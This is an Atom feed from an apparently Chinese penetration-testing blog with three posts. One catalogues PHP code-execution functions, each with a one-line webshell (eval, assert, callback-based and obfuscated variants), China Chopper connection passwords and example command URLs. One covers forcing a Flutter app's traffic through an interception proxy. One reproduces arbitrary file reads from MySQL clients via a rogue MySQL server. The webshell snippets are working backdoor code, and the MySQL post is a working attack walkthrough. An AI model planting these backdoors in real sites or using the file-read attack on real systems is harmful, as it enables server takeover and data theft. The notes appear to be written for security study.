<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>YGnight&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ygnight.xyz/"/>
  <updated>2020-01-17T08:30:16.226Z</updated>
  <id>http://ygnight.xyz/</id>
  
  <author>
    <name>YGnight</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP代码执行函数</title>
    <link href="http://ygnight.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"/>
    <id>http://ygnight.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</id>
    <published>2020-01-13T08:20:20.808Z</published>
    <updated>2020-01-17T08:30:16.226Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、eval-函数"><a href="#1、eval-函数" class="headerlink" title="1、eval()函数"></a>1、eval()函数</h2><pre><code>1.#eval() 函数把字符串按照 PHP 代码来计算2.#常见一句话：3.&lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;</code></pre><h2 id="2、assert-函数"><a href="#2、assert-函数" class="headerlink" title="2、assert()函数"></a>2、assert()函数</h2><pre><code>1.#与eval类似2.#常见一句话3.&lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;</code></pre><h2 id="3、array-map-函数"><a href="#3、array-map-函数" class="headerlink" title="3、array_map()函数"></a>3、array_map()函数</h2><pre><code>#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。#命令执行http://localhost/123.php?func=system   cmd=whoami#菜刀连接http://localhost/123.php?func=assert   密码：cmd$func=$_GET[&apos;func&apos;];$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;$new_array=array_map($func,$array);echo $new_array;</code></pre><h2 id="4、create-function-函数"><a href="#4、create-function-函数" class="headerlink" title="4、create_function()函数"></a>4、create_function()函数</h2><pre><code>#创建匿名函数#执行命令和上传文件参考eval函数(必须加分号)。#菜刀连接密码：cmd$func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();</code></pre><h2 id="5、preg-replace-函数"><a href="#5、preg-replace-函数" class="headerlink" title="5、preg_replace()函数"></a>5、preg_replace()函数</h2><pre><code>#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;)#执行命令和上传文件参考assert函数(不需要加分号)。#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code></pre><h2 id="6、call-user-func-函数"><a href="#6、call-user-func-函数" class="headerlink" title="6、call_user_func()函数"></a>6、call_user_func()函数</h2><pre><code>#传入的参数作为assert函数的参数#cmd=system(whoami)#菜刀连接密码：cmdcall_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);</code></pre><h2 id="7、call-user-func-array-函数"><a href="#7、call-user-func-array-函数" class="headerlink" title="7、call_user_func_array()函数"></a>7、call_user_func_array()函数</h2><pre><code>#将传入的参数作为数组的第一个值传递给assert函数#cmd=system(whoami)#菜刀连接密码：cmd$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);</code></pre><h2 id="8、array-filter-函数"><a href="#8、array-filter-函数" class="headerlink" title="8、array_filter()函数"></a>8、array_filter()函数</h2><pre><code>#用回调函数过滤数组中的元素：array_filter(数组,函数)#命令执行func=system&amp;cmd=whoami#菜刀连接http://localhost/123.php?func=assert  密码cmd$cmd=$_POST[&apos;cmd&apos;];$array1=array($cmd);$func =$_GET[&apos;func&apos;];array_filter($array1,$func);</code></pre><h2 id="9、uasort-函数"><a href="#9、uasort-函数" class="headerlink" title="9、uasort()函数"></a>9、uasort()函数</h2><pre><code>#php环境&gt;=&lt;5.6才能用#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmdusort($_GET,&apos;asse&apos;.&apos;rt&apos;);</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1、eval-函数&quot;&gt;&lt;a href=&quot;#1、eval-函数&quot; class=&quot;headerlink&quot; title=&quot;1、eval()函数&quot;&gt;&lt;/a&gt;1、eval()函数&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;1.#eval() 函数把字符串按照 PHP 代码来计算
2.#
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://ygnight.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="笔记" scheme="http://ygnight.xyz/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>使用drony解决Flutter框架导致APP无法抓包情况</title>
    <link href="http://ygnight.xyz/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3Flutter%E6%A1%86%E6%9E%B6%E5%AF%BC%E8%87%B4APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85%E6%83%85%E5%86%B5/"/>
    <id>http://ygnight.xyz/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3Flutter%E6%A1%86%E6%9E%B6%E5%AF%BC%E8%87%B4APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85%E6%83%85%E5%86%B5/</id>
    <published>2019-12-18T06:58:30.602Z</published>
    <updated>2019-12-18T08:19:01.665Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>默认Flutter不会主动使用系统代理，需要单独设置。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用抓包工具（Fiddler、burp等都可）抓包，模拟器安装drony抓包前设置指定代理。</p><h2 id="环境常规配置："><a href="#环境常规配置：" class="headerlink" title="环境常规配置："></a>环境常规配置：</h2><h3 id="1-抓包工具安装，证书安装；"><a href="#1-抓包工具安装，证书安装；" class="headerlink" title="1.抓包工具安装，证书安装；"></a>1.抓包工具安装，证书安装；</h3><h3 id="2-安卓模拟器安装，并安装drony-下载链接-https-pan-baidu-com-s-1PwWU6ekXstRJHOIAdrIM9Q-提取码-yjpx"><a href="#2-安卓模拟器安装，并安装drony-下载链接-https-pan-baidu-com-s-1PwWU6ekXstRJHOIAdrIM9Q-提取码-yjpx" class="headerlink" title="2.安卓模拟器安装，并安装drony(下载链接: https://pan.baidu.com/s/1PwWU6ekXstRJHOIAdrIM9Q 提取码: yjpx )"></a>2.安卓模拟器安装，并安装drony(下载链接: <a href="https://pan.baidu.com/s/1PwWU6ekXstRJHOIAdrIM9Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1PwWU6ekXstRJHOIAdrIM9Q</a> 提取码: yjpx )</h3><h3 id="3-drony配置-这里试验抓闲鱼的数据包"><a href="#3-drony配置-这里试验抓闲鱼的数据包" class="headerlink" title="3.drony配置(这里试验抓闲鱼的数据包):"></a>3.drony配置(这里试验抓闲鱼的数据包):</h3><p>进入drony,此时是off关闭状态，</p><p><img src="0.png" srcset="/img/loading.gif" alt="0"></p><p>向左划动，选择Wi-Fi</p><p><img src="1.png" srcset="/img/loading.gif" alt="1"></p><p>对wi-fi进行设置</p><p><img src="2.png" srcset="/img/loading.gif" alt="2"></p><p>选择代理模式为手动（Manual）</p><p><img src="3.png" srcset="/img/loading.gif" alt="3"></p><p>Proxy type代理方式选择 Plain http proxy ，Filter default value 选择 Direct all</p><p><img src="4.png" srcset="/img/loading.gif" alt="4"></p><p>选择Rule，设置应用规则</p><p><img src="5.png" srcset="/img/loading.gif" alt="5">)<img src="6.png" srcset="/img/loading.gif" alt="6"></p><p>Network id处 选择当前wifi的SSID，Action 选择 Local proxy chain，</p><p>Application 选择需要强制代理的APP，Hostname 及 Port 不填，表示所有的都会被强制代理。</p><p><img src="7.png" srcset="/img/loading.gif" alt="7"></p><p>返回到主页面，点击off，变为启动状态</p><p><img src="8.png" srcset="/img/loading.gif" alt="8"></p><h3 id="4-抓包工具配置："><a href="#4-抓包工具配置：" class="headerlink" title="4.抓包工具配置："></a>4.抓包工具配置：</h3><p>设置代理ip及端口</p><p><img src="8-2.png" srcset="/img/loading.gif" alt="8-2"></p><p>后续进行抓包常规操作即可</p><p><img src="9.png" srcset="/img/loading.gif" alt="9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原因&quot;&gt;&lt;a href=&quot;#原因&quot; class=&quot;headerlink&quot; title=&quot;原因&quot;&gt;&lt;/a&gt;原因&lt;/h2&gt;&lt;p&gt;默认Flutter不会主动使用系统代理，需要单独设置。&lt;/p&gt;
&lt;h2 id=&quot;解决方案&quot;&gt;&lt;a href=&quot;#解决方案&quot; class=&quot;h
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://ygnight.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="测试姿势" scheme="http://ygnight.xyz/tags/%E6%B5%8B%E8%AF%95%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>伪造mysql服务端实现任意文件读取</title>
    <link href="http://ygnight.xyz/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>http://ygnight.xyz/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</id>
    <published>2019-12-13T09:40:29.302Z</published>
    <updated>2020-01-13T08:25:16.163Z</updated>
    
    <content type="html"><![CDATA[<h2 id="研究情况："><a href="#研究情况：" class="headerlink" title="研究情况："></a>研究情况：</h2><p>  当遇到<strong>可控MYSQL</strong>时怎么进一步搞事情</p><h2 id="情景："><a href="#情景：" class="headerlink" title="情景："></a>情景：</h2><pre><code>1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql2.注入高权限，可--os-shell （可以上传另说，出现上传失败的情况可以利用）3.。。。。。其他情况</code></pre><hr><h2 id="所需环境："><a href="#所需环境：" class="headerlink" title="所需环境："></a>所需环境：</h2><pre><code>虚拟机两个，靶机装mysql，攻击端装py</code></pre><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p><a href="https://github.com/YGnight/Mysqlist" target="_blank" rel="noopener">https://github.com/YGnight/Mysqlist</a></p><h2 id="工具介绍："><a href="#工具介绍：" class="headerlink" title="工具介绍："></a>工具介绍：</h2><pre><code>exp_input.py脚本是输入文件，单独读取启动<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp_input.py<span class="built_in"> port </span> （port为端口号，3306都可）</span><br></pre></td></tr></table></figure>读取的文件最后保存在log文件夹下</code></pre><hr><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>攻击端运行攻击脚本，</p><p>exp_input.py 3306</p><p>输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini</p><p><img src="0.png" srcset="/img/loading.gif" alt="0"></p><p>靶机使用mysql向攻击端发送请求</p><p><img src="0-1.png" srcset="/img/loading.gif" alt="0-1"></p><p>password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记）</p><p><img src="1.png" srcset="/img/loading.gif" alt="1"></p><p>此时返回攻击端，可以看到dos窗口回显了信息</p><p><img src="0-0.png" srcset="/img/loading.gif" alt="0-0"></p><p>查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件</p><p><img src="0-2.png" srcset="/img/loading.gif" alt="0-2"></p><p><img src="0-3.png" srcset="/img/loading.gif" alt="0-3"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;研究情况：&quot;&gt;&lt;a href=&quot;#研究情况：&quot; class=&quot;headerlink&quot; title=&quot;研究情况：&quot;&gt;&lt;/a&gt;研究情况：&lt;/h2&gt;&lt;p&gt;  当遇到&lt;strong&gt;可控MYSQL&lt;/strong&gt;时怎么进一步搞事情&lt;/p&gt;
&lt;h2 id=&quot;情景：&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://ygnight.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="漏洞利用" scheme="http://ygnight.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
</feed>
